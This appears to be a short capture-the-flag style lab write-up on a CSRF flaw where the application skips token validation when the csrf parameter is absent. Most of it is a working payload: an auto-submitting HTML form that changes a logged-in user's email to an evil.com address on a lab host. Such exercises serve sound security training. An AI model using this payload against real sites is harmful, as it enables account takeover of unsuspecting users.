
# Lab: CSRF where token validation depends on token being present

If the post parameter "csrf" is not present in the request, the application don't check the CSRF token.

## payload 

```html

<form id="mon-formulaire" name="change-email-form" action="https://MYLAB.web-security-academy.net/my-account/change-email" method="POST">               
<input required type="email" name="email" value="tokenIsNotPresent@evil.com">
</form>

<script>
    let formulaire = document.getElementById("mon-formulaire");
    formulaire.submit()

</script>
```

